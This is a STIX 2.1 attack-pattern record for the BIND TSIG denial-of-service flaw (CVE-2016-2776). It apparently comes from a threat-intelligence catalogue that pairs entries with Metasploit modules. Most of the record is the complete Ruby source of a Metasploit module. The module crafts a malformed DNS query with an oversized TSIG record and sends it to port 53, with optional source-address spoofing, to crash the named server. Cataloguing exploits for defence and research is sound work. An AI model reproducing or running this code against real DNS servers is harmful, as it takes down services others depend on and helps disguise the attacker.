{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--585e7eea-e050-4aff-9810-08c8ec66d455",
    "created": "2024-08-14T16:24:32.504163Z",
    "modified": "2024-08-14T16:24:32.504167Z",
    "name": "BIND TSIG Query Denial of Service",
    "description": " A defect in the rendering of messages into packets can cause named to exit with an assertion failure in buffer.c while constructing a response to a query that meets certain criteria.  This assertion can be triggered even if the apparent source address isn't allowed to make queries.  # Research and Original PoC - msf module author",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/dns/bind_tsig.rb",
            "external_id": "bind_tsig.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-2776"
        },
        {
            "source_name": "reference",
            "url": "http://blog.infobytesec.com/2016/10/a-tale-of-dns-packet-cve-2016-2776.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n  include Msf::Auxiliary::UDPScanner\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BIND TSIG Query Denial of Service',\n      'Description'    => %q{\n        A defect in the rendering of messages into packets can cause named to\n        exit with an assertion failure in buffer.c while constructing a response\n        to a query that meets certain criteria.\n\n        This assertion can be triggered even if the apparent source address\n        isn't allowed to make queries.\n      },\n      # Research and Original PoC - msf module author\n      'Author'         => [\n        'Martin Rocha',\n        'Ezequiel Tavella',\n        'Alejandro Parodi',\n        'Infobyte Research Team'\n      ],\n      'References'     => [\n        ['CVE', '2016-2776'],\n        ['URL', 'http://blog.infobytesec.com/2016/10/a-tale-of-dns-packet-cve-2016-2776.html']\n      ],\n      'DisclosureDate' => '2016-09-27',\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => {'ScannerRecvWindow' => 0}\n    ))\n\n    register_options([\n      Opt::RPORT(53),\n      OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])\n    ])\n\n    deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')\n  end\n\n  def scan_host(ip)\n    if datastore['SRC_ADDR']\n      scanner_spoof_send(payload, ip, rport, datastore['SRC_ADDR'])\n    else\n      print_status(\"Sending packet to #{ip}\")\n      scanner_send(payload, ip, rport)\n    end\n  end\n\n  def payload\n    query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65\n    query << \"\\x00\\x00\"  # Flags: 0x0000 Standard query\n    query << \"\\x00\\x01\"  # Questions: 1\n    query << \"\\x00\\x00\"  # Answer RRs: 0\n    query << \"\\x00\\x00\"  # Authority RRs: 0\n    query << \"\\x00\\x01\"  # Additional RRs: 1\n\n    # Domain Name\n    query << get_domain   # Random DNS Name\n    query << \"\\x00\"      # [End of name]\n    query << \"\\x00\\x01\"  # Type: A (Host Address) (1)\n    query << \"\\x00\\x01\"  # Class: IN (0x0001)\n\n    # Additional records. Name\n    query << (\"\\x3f\"+Rex::Text.rand_text_alphanumeric(63))*3 #192 bytes\n    query << \"\\x3d\"+Rex::Text.rand_text_alphanumeric(61)\n    query << \"\\x00\"\n\n    query << \"\\x00\\xfa\" # Type: TSIG (Transaction Signature) (250)\n    query << \"\\x00\\xff\" # Class: ANY (0x00ff)\n    query << \"\\x00\\x00\\x00\\x00\" # Time to live: 0\n    query << \"\\x00\\xfc\" # Data length: 252\n\n    # Algorithm Name\n    query << (\"\\x3f\"+Rex::Text.rand_text_alphanumeric(63))*3 #Random 192 bytes\n    query << \"\\x1A\"+Rex::Text.rand_text_alphanumeric(26) #Random 26 bytes\n    query << \"\\x00\"\n\n    # Rest of TSIG\n    query << \"\\x00\\x00\"+Rex::Text.rand_text_alphanumeric(4) # Time Signed: Jan  1, 1970 03:15:07.000000000 ART\n    query << \"\\x01\\x2c\" # Fudge: 300\n    query << \"\\x00\\x10\" # MAC Size: 16\n    query <<  Rex::Text.rand_text_alphanumeric(16) # MAC\n    query << \"\\x8f\\x65\" # Original Id: 36709\n    query << \"\\x00\\x00\" # Error: No error (0)\n    query << \"\\x00\\x00\" # Other len: 0\n  end\n\n  def get_domain\n    domain = \"\\x06\"+Rex::Text.rand_text_alphanumeric(6)\n    org = \"\\x03\"+Rex::Text.rand_text_alphanumeric(3)\n    domain+org\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-09-27"
}